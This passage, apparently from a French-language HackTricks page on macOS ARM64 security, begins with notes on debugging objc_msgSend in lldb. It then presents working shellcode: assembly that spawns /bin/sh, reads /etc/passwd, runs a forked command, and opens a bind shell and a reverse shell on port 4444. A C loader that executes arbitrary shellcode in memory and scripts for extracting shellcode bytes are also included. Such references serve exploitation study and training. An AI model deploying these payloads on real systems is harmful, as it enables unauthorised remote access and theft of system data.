- x1: op -> Sélecteur de la méthode
- x2... -> Reste des arguments de la méthode invoquée

Donc, si vous placez un breakpoint avant la branche vers cette fonction, vous pouvez facilement trouver ce qui est invoqué dans lldb avec (dans cet exemple l'objet appelle un objet de `NSConcreteTask` qui exécutera une commande):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Setting the env variable **`NSObjCMessageLoggingEnabled=1`** it's possible to log when this function is called in a file like `/tmp/msgSends-pid`.
>
> Moreover, setting **`OBJC_HELP=1`** and calling any binary you can see other environment variables you could use to **log** when certain Objc-C actions occurs.

Lorsque cette fonction est appelée, il faut trouver la méthode appelée de l'instance indiquée ; pour cela différentes recherches sont effectuées :

- Effectuer une recherche optimiste dans le cache :
- Si la recherche réussit, terminé
- Acquérir runtimeLock (read)
- Si (realize && !cls->realized) realize class
- Si (initialize && !cls->initialized) initialize class
- Tester le cache propre à la classe :
- Si la recherche réussit, terminé
- Tester la liste des méthodes de la classe :
- Si trouvée, remplir le cache et terminé
- Tester le cache de la superclasse :
- Si la recherche réussit, terminé
- Tester la liste des méthodes de la superclasse :
- Si trouvée, remplir le cache et terminé
- Si (resolver) essayer le method resolver, et répéter à partir de la class lookup
- Si on en est encore là (= tout le reste a échoué), essayer le forwarder

### Shellcodes

Pour compiler:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Pour extraire les octets :
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Pour les versions récentes de macOS :
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Code C pour tester le shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Extrait de [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) et expliqué.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Lire avec cat

L'objectif est d'exécuter `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, donc le deuxième argument (x1) est un array de params (qui en mémoire signifie un stack des addresses).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Exécuter une commande avec sh depuis un fork pour que le processus principal ne soit pas terminé
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell depuis [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) sur le **port 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Depuis [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell vers **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
